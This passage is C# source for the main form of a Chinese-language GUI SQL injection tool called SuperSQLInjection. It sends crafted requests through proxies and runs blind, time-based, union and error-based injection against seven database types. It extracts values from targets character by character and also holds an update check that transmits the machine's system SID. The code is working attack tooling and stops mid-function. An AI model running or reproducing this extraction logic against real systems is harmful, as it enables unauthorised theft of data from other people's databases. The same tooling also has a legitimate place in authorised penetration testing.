using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using tools;
using System.Threading;
using SuperSQLInjection.tools;
using model;
using SuperSQLInjection.model;
using SuperSQLInjection.payload;
using System.Text.RegularExpressions;
using System.IO;
using System.Collections;
using SuperSQLInjection.scan;
using System.Web;
using System.Net;
using Amib.Threading;
using System.Drawing;
using System.Reflection;
using static System.Windows.Forms.ListView;
using SuperSQLInjection.tools.http;
using System.Net.Sockets;
using System.Xml;

namespace SuperSQLInjection
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
        }
        public ShowResponse sr = null;
        public Config config = new Config();//注入基础配置
        public const Char DBVers_Splite_Str = '：';
        public String curren_db = "";//当前数据库
        public String curren_table = "";//当前表
        public static int status = 0;

        public int currentDbsCount = 0;
        public int currentTableCount = 0;
        public int currentDataCount = 0;
        public int dbsCount = 0;
        public int tableCount = 0;
        public int dataCount = 0;
        public int runTime = 0;
        public const String setInjectStr = "#inject#";
        public Dictionary<String, ServerInfo> serverinfo_list = new Dictionary<String, ServerInfo>();
        public Hashtable replaceList = new Hashtable();
        public HashSet<String> scan_list = new HashSet<String>();
        public int loadListStatus = 0;//注入双击导入扫描URL
        //自动识别注入跳过参数
        public static List<String> jumpkeyList = FileTool.readFileToList("config/injection/jumpkey.txt");
        public static int comm_count = 0;//猜测的表数量

        public static int comm_currentCount = 0;//猜测的数量

        public int injectionURLCount = 0;//注入URL数

        //代理池
        public Dictionary<String, Proxy> proxy_List = new Dictionary<String, Proxy>();

        public int loadProxyList = 0;//代理池未加载完成，1加载完成，加载完成后，才允许人工添加

        //不放到Config中序列化，防止信息泄露
        //当前设置的代理
        public Proxy proxy = new Proxy();
        public int checkProxyStatus = 0;//验证代理状态，如果是1，表示正在验证，否则表示完成

        private SmartThreadPool stp = new SmartThreadPool();

        public void sendRequestAndShowResponse()
        {
            if (this.sr != null)
            {
                this.sr.Close();
            }

            if (Thread.CurrentThread.Name == null)
            {
                Thread.CurrentThread.Name = "SendThread-";
            }
            ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, "", this.txt_inject_request.Text, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
            this.btn_inject_sendData.Enabled = true;
            if (server.timeout)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "连接超时！", LogLevel.error);
            }
            else
            {
                ShowResponse sr = new ShowResponse();
                sr.server = server;
                this.sr = sr;
                sr.ShowDialog();
            }

        }
        public void sendRequest()
        {
            if (this.sr != null)
            {
                this.sr.Close();
            }

            if (Thread.CurrentThread.Name == null)
            {
                Thread.CurrentThread.Name = "SendThread-";
            }
            ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, "", this.txt_inject_request.Text, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
            this.btn_inject_sendData.Enabled = true;
            if (server.timeout)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "连接超时！", LogLevel.error);
                this.btn_inject_sendData.Enabled = true;
            }
            else
            {
                this.Invoke(new delegateVoidShowResponse(ShowResponse), server);
            }
        }

        private delegate void delegateVoidShowResponse(ServerInfo server);

        private void ShowResponse(ServerInfo server)
        {
            ShowResponse sr = new ShowResponse();
            sr.server = server;
            this.sr = sr;
            sr.ShowDialog();
        }

        delegate void delegateVoid();

        private void btn_inject_sendData_Click(object sender, EventArgs e)
        {
            if (checkSendDataConfig())
            {
                this.btn_inject_sendData.Enabled = false;
                Thread t = new Thread(sendRequest);
                t.Start();
            }
        }
        private void addDBSToItems()
        {

            string[] dbnames = Enum.GetNames(typeof(DBType));
            this.cbox_basic_dbType.Items.AddRange(dbnames);
        }

        private void Main_Shown(object sender, EventArgs e)
        {
            HTTP.initMain(this);
            //添加支持注入的数据库列表
            addDBSToItems();
            //清空日志
            Thread t = new Thread(Tools.delHTTPLog);
            t.Start();

            //加载代理池
            Thread loadProxyListThread = new Thread(reloadProxyList);
            loadProxyList = 0;
            loadProxyListThread.Start();

            //加载注入日志记录
            Thread tt = new Thread(loadInjectLogs);
            tt.Start();


            //初始化配置
            this.Text = "超级SQL注入工具 v1.0 正式版 " + version;
            this.cbox_basic_encoding.SelectedIndex = 0;
            this.cbox_basic_threadSize.SelectedIndex = 9;
            this.cbox_basic_timeOut.SelectedIndex = 4;
            this.cbox_basic_reTryCount.SelectedIndex = 1;
            this.data_dbs_cob_db_encoding.SelectedIndex = 0;
            this.bypass_cbox_sendHTTPSleepTime.SelectedIndex = 0;
            this.cbox_bypass_urlencode_count.SelectedIndex = 0;
            this.cbox_base64Count.SelectedIndex = 0;
            this.proxy_txt_addProxyType.SelectedIndex = 0;



            //加载当前代理配置
            try
            {
                this.proxy = (Proxy)XML.readObject(AppDomain.CurrentDomain.BaseDirectory + "/proxy/proxy.xml", proxy);
                this.proxy_lbl_proxy_host.Text = this.proxy.host;
                this.proxy_lbl_proxy_port.Text = this.proxy.port.ToString();
                this.proxy_lbl_proxyType.Text = this.proxy.proxyType;
                this.proxy_lbl_proxy_username.Text = this.proxy.username;
                this.proxy_lbl_proxy_password.Text = this.proxy.password;
                log("自动加载当前固定代理配置成功！", LogLevel.success);
            }
            catch (Exception ex)
            {
                log("自动加载当前固定代理配置失败！", LogLevel.waring);
                Tools.SysLog("加载当前固定代理配置失败！" + ex.Message);
            }

            //加载配置
            try
            {
                this.config = XML.readConfig(AppDomain.CurrentDomain.BaseDirectory + "/lastConfig.xml");
                reloadConfig(this.config);
                this.txt_log.Invoke(new showLogDelegate(log), "自动加载上次配置成功！", LogLevel.success);
            }
            catch (Exception ex)
            {
                Tools.SysLog("加载配置发生错误！" + ex.Message);
            }

            InjectionTools.addErrorCode();
            //读取模板
            List<String> templates = FileTool.readAllDic("/config/template/");
            foreach (String templateName in templates)
            {
                this.bypass_cbox_loadTemplate.Items.Add(templateName);
            }
            if (config.isAutoCheckUpdate)
            {
                new Thread(checkUpdate).Start();
            }
        }

        private void reloadProxyList()
        {
            try
            {
                this.proxy_List = FileTool.ReadProxyList(AppDomain.CurrentDomain.BaseDirectory + "/proxy/proxylist.txt");
                if (this.proxy_List.Count > 0)
                {
                    foreach (Proxy proxy in this.proxy_List.Values)
                    {
                        this.proxy_lvw_proxyList.Invoke(new DelegateAddItemToProxy(addItemsToProxy_lvw), proxy);
                    }
                }
                this.txt_log.Invoke(new showLogDelegate(log), "自动加载上次代理池配置成功，发现代理：" + this.proxy_List.Count + "个！", LogLevel.success);
                loadProxyList = 1;
            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "自动加载上次代理池配置失败！" + e.Message, LogLevel.waring);
            }

        }
        public void loadInjectLogs()
        {
            //加载注入日志记录
            List<String> clist = Tools.readAllXmlFile(AppDomain.CurrentDomain.BaseDirectory + "/logs/injection/", null);
            foreach (String path in clist)
            {
                Config config = XML.readConfig(path);
                this.lvw_injectLog.Invoke(new delegatelogInject(logInjectTolvw), config);
            }
        }


        public void HttpDownloadFile(string url, string path)
        {
            // 设置参数
            HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;

            //发送请求并获取相应回应数据
            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
            //直到request.GetResponse()程序才开始向目标网页发送Post请求
            Stream responseStream = response.GetResponseStream();
            long sum = response.ContentLength;
            //创建本地文件写入流
            Stream stream = new FileStream(path, FileMode.Create);

            byte[] bArr = new byte[1024];
            int size = responseStream.Read(bArr, 0, (int)bArr.Length);
            int csum = 0;
            csum += size;
            while (size > 0)
            {
                stream.Write(bArr, 0, size);
                size = responseStream.Read(bArr, 0, (int)bArr.Length);
                csum += size;
                int val = (int)(csum * 100 / sum);
                this.lbl_info.Text = "下载更新文件：" + val + "%";
            }
            this.lbl_info.Text = "下载更新文件完成！";
            stream.Close();
            responseStream.Close();
        }

        public static int version = 20190903;
        public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=SSuperSQLInjection&NO=" + URLEncode.UrlEncode(Tools.getSystemSid()) + "&VERSION=" + version;
        //检查更新
        public void checkUpdate()
        {
            try
            {
                String[] result = HttpTools.getHtml(versionURL, 30).Split('-');
                String versionText = result[0];
                int cversion = int.Parse(result[1]);
                String versionUpdateURL = result[2];
                if (cversion > version)
                {
                    DialogResult dr = MessageBox.Show("发现新版本：" + versionText + "，更新日期：" + cversion + "，立即更新吗？", "提示", MessageBoxButtons.OKCancel);

                    if (DialogResult.OK.Equals(dr))
                    {
                        try
                        {
                            int index = versionUpdateURL.LastIndexOf("/");
                            String filename = "update.rar";
                            if (index != -1)
                            {
                                filename = versionUpdateURL.Substring(index);
                            }
                            HttpDownloadFile(versionUpdateURL, AppDomain.CurrentDomain.BaseDirectory + filename);
                            MessageBox.Show("更新成功，请将压缩包解压后运行！");
                        }

                        catch (Exception other)
                        {
                            MessageBox.Show("更新失败，请访问官网更新！" + other.GetBaseException());
                        }
                    }
                }
                else
                {
                    this.txt_log.Invoke(new showLogDelegate(log), "自动检查更新，没有发现新版本！", LogLevel.info);
                }
            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "无法连接更新服务器！" + e.Message, LogLevel.info);
            }
        }

        /***
         * 检查配置是否完整
         * 
         * **/

        public Boolean checkConfig()
        {

            if ("".Equals(this.txt_basic_host.Text))
            {
                MessageBox.Show("没有填写目标地址！");
                return false;
            }

            config.domain = this.txt_basic_host.Text;

            try
            {
                config.port = int.Parse(this.txt_basic_port.Text);
            }
            catch
            {
                MessageBox.Show("把目标端口写上吧！");

                return false;
            }

            if (InjectType.UnKnow.Equals(config.injectType))
            {
                MessageBox.Show("注入类型还未设置，您可以人工设置或点击自动识别！");
                return false;
            }
            config.injectType = (InjectType)this.cbox_basic_injectType.SelectedIndex;


            if (DBType.UnKnow.Equals(config.dbType))
            {
                MessageBox.Show("数据库类型还未设置，您可以人工设置或点击自动识别！");
                return false;
            }

            config.dbType = (DBType)this.cbox_basic_dbType.SelectedIndex;

            try
            {
                config.timeOut = int.Parse(this.cbox_basic_timeOut.Text);
            }
            catch
            {
                MessageBox.Show("每次请求多少时间？没响应我就放弃啦！");
                return false;
            }


            if ("".Equals(this.cbox_basic_encoding.Text))
            {
                MessageBox.Show("网页是啥编码呢？我不会去猜的，赶快告诉我！");
                return false;
            }
            config.encoding = this.cbox_basic_encoding.Text;

            try
            {
                config.threadSize = int.Parse(this.cbox_basic_threadSize.Text);
            }
            catch
            {
                MessageBox.Show("大侠，同时启动多少个线程呢！");
                return false;
            }

            try
            {
                config.reTry = int.Parse(this.cbox_basic_reTryCount.Text);
            }
            catch
            {
                MessageBox.Show("失败了不能放弃，我能试几次？");
                return false;
            }

            if (this.cbox_basic_injectType.SelectedIndex == 0 && this.txt_inject_key.Text == "")
            {
                MessageBox.Show("盲注需要设置判断值，这个判断值呢，就是正常时（and 1=1）存在的情况，而不正常时（and 1=2）不存在的情况！");
                return false;
            }
            if (InjectType.Union.Equals(config.injectType))
            {
                if (DBType.DB2.Equals(config.dbType))
                {
                    if (this.txt_inject_unionTemplate.Text.Length <= 0)
                    {
                        MessageBox.Show("DB2 Union注入，需要设置填充模板，填充方法，请参考使用说明书！");
                        this.txt_inject_unionTemplate.Focus();
                        return false;
                    }
                }
                else
                {
                    if (this.txt_inject_unionColumnsCount.Text.Length <= 0 || this.txt_inject_showIndex.Text.Length <= 0)
                    {
                        MessageBox.Show("Union注入需要设置查询总列数和数据显示列！");
                        this.txt_inject_unionColumnsCount.Focus();
                        return false;
                    }
                }
            }


            config.key = this.txt_inject_key.Text;

            if (this.txt_inject_request.Text == "")
            {
                MessageBox.Show("没有设置数据包！");
                return false;
            }

            if (this.txt_inject_request.Text.IndexOf("<Token>") != -1 && config.threadSize > 1)
            {
                MessageBox.Show("当有Token随机值时，线程只能为单线程！");
                this.cbox_basic_threadSize.SelectedIndex = 0;
            }

            config.request = this.txt_inject_request.Text;
            //设置线程池控制
            stp.MaxThreads = config.threadSize;
            return true;

        }

        public Boolean checkSendDataConfig()
        {
            if ("".Equals(this.txt_inject_request.Text))
            {
                MessageBox.Show("没有数据包！");
                return false;
            }

            if ("".Equals(this.txt_basic_host.Text))
            {
                MessageBox.Show("描述没有填写目标地址！");
                return false;
            }

            config.domain = this.txt_basic_host.Text;

            try
            {
                config.port = int.Parse(this.txt_basic_port.Text);
            }
            catch
            {
                MessageBox.Show("把目标端口写上吧！");
                return false;
            }

            try
            {
                config.timeOut = int.Parse(this.cbox_basic_timeOut.Text);
            }
            catch
            {
                MessageBox.Show("每次请求多少时间？没响应我就放弃啦！");
                return false;
            }


            if ("".Equals(this.cbox_basic_encoding.Text))
            {
                MessageBox.Show("网页是啥编码呢？我不会去猜的，赶快告诉我！");
                return false;
            }
            config.encoding = this.cbox_basic_encoding.Text;

            try
            {
                config.threadSize = int.Parse(this.cbox_basic_threadSize.Text);
            }
            catch
            {
                MessageBox.Show("每次请求多少时间？没响应我就放弃啦！");
                return false;
            }
            config.is_foward_302 = this.chk_inject_foward_302.Checked;
            return true;

        }
        public void getVariablesBySleep(DBType dbType)
        {




        }
        /// <summary>
        /// 获得union获得error注入的获得的数据内容
        /// </summary>
        /// <param name="opayload"></param>
        /// <returns></returns>
        public String getOneDataByUnionOrError(String opayload)
        {

            try
            {
                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, opayload.ToString(), config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                if (server.body != null && server.body.Length > 0)
                {
                    //查找格式^^!col$$$col!^^
                    Match m = Regex.Match(server.body, "(?<=(\\^\\^\\!))[.\\s\\S]*?(?=(\\!\\^\\^))");
                    if (m.Success)
                    {
                        return m.Value;
                    }
                }
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "发生异常：" + e.Message, LogLevel.error);

            }
            return "";
        }

        /// <summary>
        /// 获得union获得error注入的获得的数据内容
        /// </summary>
        /// <param name="opayload"></param>
        /// <returns></returns>
        public String getOneDataByUnionOrErrorByInformix(String opayload)
        {
            return getOneDataByUnionOrError(opayload, Informix.start + Informix.start, Informix.end + Informix.end);
        }

        /// <summary>
        /// 获得union获得error注入的获得的数据内容
        /// </summary>
        /// <param name="opayload"></param>
        /// <returns></returns>
        public String getOneDataByUnionOrError(String opayload, String start, String end)
        {

            try
            {
                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, opayload.ToString(), config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                if (server.body != null && server.body.Length > 0)
                {
                    //查找格式^^!col$$$col!^^
                    Match m = Regex.Match(server.body, "(?<=(" + start + "))[.\\s\\S]*?(?=(" + end + "))");
                    if (m.Success)
                    {
                        return m.Value;
                    }
                }
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "发生异常：" + e.Message, LogLevel.error);

            }
            return "";
        }



        /// <summary>
        /// 获得union error注入的获得的hex数据内容
        /// </summary>
        /// <param name="opayload"></param>
        /// <returns></returns>
        public String getOneHexDataByUnionOrError(String opayload)
        {

            try
            {
                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, opayload.ToString(), config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                if (server.body != null && server.body.Length > 0)
                {
                    //查找格式
                    Match m = Regex.Match(server.body, "(?<=(\\-\\-\\:))[.\\s\\S]*?(?=(\\:\\-\\-))");
                    if (m.Success)
                    {
                        return Tools.unHex(m.Value, config.db_encoding);
                    }
                }
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "发生异常：" + e.Message, LogLevel.error);

            }
            return "";
        }

        public String getOneHexNoUnHexDataByUnionOrError(String opayload)
        {

            try
            {
                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, opayload.ToString(), config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                if (server.body != null && server.body.Length > 0)
                {
                    //查找格式
                    Match m = Regex.Match(server.body, "(?<=(\\-\\-\\:))[.\\s\\S]*?(?=(\\:\\-\\-))");
                    if (m.Success)
                    {
                        return m.Value;
                    }
                }
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "发生异常：" + e.Message, LogLevel.error);

            }
            return "";
        }


        public void getVariablesByUnionByMySQL(Object v)
        {
            if (status == 0)
            {

                Thread.CurrentThread.Abort();
            }
            String[] sv = v.ToString().Split(DBVers_Splite_Str);
            List<String> column_list = new List<String>();
            column_list.Add(sv[1]);
            String columns = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, column_list, null, null, -1);
            String pay_load = MySQL.union_value.Replace("{data}", columns);
            String result = getOneDataByUnionOrError(pay_load);
            this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void getVariablesByUnionBySQLServer(Object v)
        {

            String[] sv = v.ToString().Split(DBVers_Splite_Str);
            String pay_load = SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, sv[1]);
            String result = getOneDataByUnionOrError(pay_load);
            this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void getVariablesByUnionByPostgreSQL(Object v)
        {

            String[] sv = v.ToString().Split(DBVers_Splite_Str);
            List<String> column_list = new List<String>();
            column_list.Add(sv[1]);
            String pay_load = PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, sv[1], "", "", "");
            String result = getOneDataByUnionOrError(pay_load);
            this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void getVariablesByUnionByOracle(Object v)
        {

            String[] sv = v.ToString().Split(DBVers_Splite_Str);
            String pay_load = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, sv[1], "", "", "");
            String result = getOneDataByUnionOrError(pay_load);
            this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
            Interlocked.Increment(ref this.currentDataCount);
        }
        public void getVariablesByUnionByDB2(Object v)
        {
            String[] sv = v.ToString().Split(DBVers_Splite_Str);
            String pay_load = DB2.getUnionDataValue(config.unionFillTemplate, sv[1], "", "", "");
            String result = getOneDataByUnionOrError(pay_load);
            this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void getVariablesByUnionByInformix(Object v)
        {
            String[] sv = v.ToString().Split(DBVers_Splite_Str);
            String pay_load = Informix.getUnionDataValue(config.unionFillTemplate, sv[1], "", "", "", Informix.cast_value);
            String result = getOneDataByUnionOrErrorByInformix(pay_load);
            this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void getVariablesByUnionBySQLite(Object v)
        {
            String[] sv = v.ToString().Split(DBVers_Splite_Str);
            String pay_load = SQLite.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, sv[1]);
            String result = getOneDataByUnionOrError(pay_load);
            this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void getVariablesByErrorByMySQL(Object v)
        {
            String[] sv = v.ToString().Split(DBVers_Splite_Str);
            List<String> column_list = new List<String>();
            column_list.Add(sv[1]);
            String columns = MySQL.creatMySQLColumnsStrByError(column_list, null, null, -1);
            String pay_load = MySQL.error_value.Replace("{data}", columns);
            String result = getOneDataByUnionOrError(pay_load);
            result = HttpUtility.HtmlDecode(result);
            this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void getVariablesByErrorByPostgreSQL(Object v)
        {
            String[] sv = v.ToString().Split(DBVers_Splite_Str);
            List<String> column_list = new List<String>();
            column_list.Add(sv[1]);
            String pay_load = PostgreSQL.error_value.Replace("{data}", sv[1]);
            String result = getOneDataByUnionOrError(pay_load);
            result = HttpUtility.HtmlDecode(result);
            this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void getVariablesByErrorBySQLServer(Object v)
        {
            String[] sv = v.ToString().Split(DBVers_Splite_Str);
            List<String> column_list = new List<String>();
            column_list.Add(sv[1]);
            String pay_load = SQLServer.error_value.Replace("{data}", sv[1]);
            String result = getOneDataByUnionOrError(pay_load);
            //错误显示会HTML编码，所以需要HTML解码
            result = HttpUtility.HtmlDecode(result);
            this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void getVariablesByErrorByOracle(Object v)
        {
            String[] sv = v.ToString().Split(DBVers_Splite_Str);
            List<String> column_list = new List<String>();
            column_list.Add(sv[1]);
            String pay_load = Oracle.getErrorDataValue(sv[1], "", "", "");
            String result = getOneHexDataByUnionOrError(pay_load);
            result = HttpUtility.HtmlDecode(result);
            this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
            Interlocked.Increment(ref this.currentDataCount);
        }

        //立即结束线程池
        private void StopThread()
        {
            status = -1;
            if (this.currentThread != null)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "发出停止线程信号！", LogLevel.info);
                stp.Cancel();
                this.currentThread.Abort();

            }
            status = 0;

        }

        public void getVariablesByUnion(DBType dbType)
        {
            this.dataCount = this.data_lvw_ver.CheckedItems.Count;
            if (this.data_lvw_ver.CheckedItems.Count > 0)
            {
                for (int j = 0; j < this.data_lvw_ver.CheckedItems.Count; j++)
                {
                    String v = this.data_lvw_ver.CheckedItems[j].SubItems[0].Text + DBVers_Splite_Str + this.data_lvw_ver.CheckedItems[j].Tag;
                    switch (dbType)
                    {
                        case DBType.Access:
                            MessageBox.Show("报告大侠，Access数据库不支持此功能！");
                            break;
                        case DBType.MySQL:
                            stp.QueueWorkItem<String>(getVariablesByUnionByMySQL, v);
                            break;
                        case DBType.SQLServer:
                            stp.QueueWorkItem<String>(getVariablesByUnionBySQLServer, v);
                            break;
                        case DBType.Oracle:
                            stp.QueueWorkItem<String>(getVariablesByUnionByOracle, v);
                            break;
                        case DBType.PostgreSQL:
                            stp.QueueWorkItem<String>(getVariablesByUnionByPostgreSQL, v);
                            break;
                        case DBType.DB2:
                            stp.QueueWorkItem<String>(getVariablesByUnionByDB2, v);
                            break;
                        case DBType.SQLite:
                            stp.QueueWorkItem<String>(getVariablesByUnionBySQLite, v);
                            break;
                        case DBType.Informix:
                            stp.QueueWorkItem<String>(getVariablesByUnionByInformix, v);
                            break;
                    }
                }
                stp.WaitForIdle();
            }
            else
            {
                MessageBox.Show("请选择要获取的环境变量！");
            }




        }
        public void getVariablesByError(DBType dbType)
        {
            this.dataCount = this.data_lvw_ver.CheckedItems.Count;
            if (this.data_lvw_ver.CheckedItems.Count > 0)
            {
                for (int j = 0; j < this.data_lvw_ver.CheckedItems.Count; j++)
                {
                    String v = this.data_lvw_ver.CheckedItems[j].SubItems[0].Text + DBVers_Splite_Str + this.data_lvw_ver.CheckedItems[j].Tag;
                    switch (dbType)
                    {
                        case DBType.Access:
                            MessageBox.Show("抱歉，Access数据库不支持错误显示方式注入！");
                            break;
                        case DBType.MySQL:
                            stp.QueueWorkItem<String>(getVariablesByErrorByMySQL, v);
                            break;
                        case DBType.SQLServer:
                            stp.QueueWorkItem<String>(getVariablesByErrorBySQLServer, v);
                            break;
                        case DBType.Oracle:
                            stp.QueueWorkItem<String>(getVariablesByErrorByOracle, v);
                            break;
                        case DBType.PostgreSQL:
                            stp.QueueWorkItem<String>(getVariablesByErrorByPostgreSQL, v);
                            break;
                        case DBType.DB2:
                            MessageBox.Show("抱歉DB2数据库暂不支持显错方式获取数据！");
                            break;

                    }
                }
                stp.WaitForIdle();
            }
            else
            {
                MessageBox.Show("请选择要获取的环境变量！");
            }


        }

        public void getVariablesByBool(DBType dbType)
        {
            this.dataCount = this.data_lvw_ver.CheckedItems.Count;
            if (this.data_lvw_ver.CheckedItems.Count > 0)
            {
                for (int j = 0; j < this.data_lvw_ver.CheckedItems.Count; j++)
                {
                    String v = this.data_lvw_ver.CheckedItems[j].SubItems[0].Text + DBVers_Splite_Str + this.data_lvw_ver.CheckedItems[j].Tag;
                    switch (dbType)
                    {
                        case DBType.Access:
                            MessageBox.Show("报告大侠，Access数据库不支持此功能！");
                            break;
                        case DBType.MySQL:
                            //获取对应环境变量值
                            if (config.keyType.Equals(KeyType.Time))
                            {
                                stp.QueueWorkItem<String>(getVariableByBoolByMySQLSleep, v);
                            }
                            else
                            {
                                stp.QueueWorkItem<String>(getVariableByBoolByMySQL, v);
                            }
                            break;
                        case DBType.SQLServer:
                            //获取对应环境变量值
                            if (config.keyType.Equals(KeyType.Time))
                            {
                                stp.QueueWorkItem<String>(getVariableByBoolBySQLServerSleep, v);
                            }
                            else
                            {
                                stp.QueueWorkItem<String>(getVariableByBoolBySQLServer, v);
                            }
                            break;
                        case DBType.Oracle:
                            stp.QueueWorkItem<String>(getVariableByBoolByOracle, v);
                            break;
                        case DBType.PostgreSQL:
                            if (config.keyType.Equals(KeyType.Time))
                            {
                                stp.QueueWorkItem<String>(getVariableByBoolByPostgreSQLSleep, v);
                            }
                            else
                            {
                                stp.QueueWorkItem<String>(getVariableByBoolByPostgreSQL, v);
                            }

                            break;
                        case DBType.DB2:
                            stp.QueueWorkItem<String>(getVariableByBoolByDB2, v);
                            break;
                        case DBType.SQLite:
                            //获取对应环境变量值
                            stp.QueueWorkItem<String>(getVariableByBoolBySQLite, v);
                            break;
                        case DBType.Informix:
                            if (config.keyType.Equals(KeyType.Time))
                            {
                                stp.QueueWorkItem<String>(getVariableByBoolByInformixSleep, v);
                            }
                            else
                            {
                                stp.QueueWorkItem<String>(getVariableByBoolByInformix, v);
                            }

                            break;
                    }
                }
                stp.WaitForIdle();
            }
            else
            {
                MessageBox.Show("请选择要获取的环境变量！");
            }


        }

        /**
         获取环境变量
         */
        public void getVers()
        {
            //检查注入配置
            if (checkConfig())
            {
                //判断是否标记注入点
                if (isSetInjectPoint())
                {
                    this.currentDataCount = 0;
                    switch (config.injectType)
                    {
                        case InjectType.Blind:
                            getVariablesByBool(config.dbType);
                            break;
                        case InjectType.Union:
                            getVariablesByUnion(config.dbType);
                            break;
                        case InjectType.Error:
                            getVariablesByError(config.dbType);
                            break;
                    }

                }

            }

        }
        public Thread currentThread = null;

        private void getVariable()
        {
            if (stp.InUseThreads == 0)
            {
                stp.Start();
                status = 1;
                currentThread = new Thread(getVers);
                currentThread.Start();
            }
            else
            {

                MessageBox.Show("还有线程未结束，请稍后...");
            }
        }
        private void data_cms_tsmi_getVariable_Click(object sender, EventArgs e)
        {
            getVariable();
        }

        public delegate void setVariableDelegate(String name, String value);
        public void setVariable(String name, String value)
        {
            ListViewItem lvi = this.data_lvw_ver.FindItemWithText(name);
            if (lvi.SubItems.Count <= 1)
            {
                lvi.SubItems.Add(value);
            }
            else
            {
                lvi.SubItems[1].Text = value;
            }


        }

        /// <summary>
        /// 获取环境变量mysql bool
        /// </summary>
        /// <param name="vers"></param>
        public void getVariableByBoolByMySQL(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                String payload_len = MySQL.ver_length.Replace("{data}", vs[1]);
                int len = getValueByStepUp(payload_len, 0, 10);
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
                String va_payload = MySQL.ver_value.Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 32, 126);
                    value += ((char)ascii).ToString();
                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        public void getVariableByBoolByMySQLSleep(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(DBVers_Splite_Str);

                String payload_len = MySQL.getBoolDataBySleep(MySQL.bool_length, config.maxTime).Replace("{data}", vs[1]);

                int len = getValueByStepUp(payload_len, 0, 10);
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
                String va_payload = MySQL.getBoolDataBySleep(MySQL.bool_value, config.maxTime).Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 32, 126);
                    value += ((char)ascii).ToString();
                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);

        }

        public void getVariableByBoolByPostgreSQLSleep(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(DBVers_Splite_Str);

                String payload_len = PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_length, config.maxTime).Replace("{data}", vs[1]);

                int len = getValueByStepUp(payload_len, 0, 10);
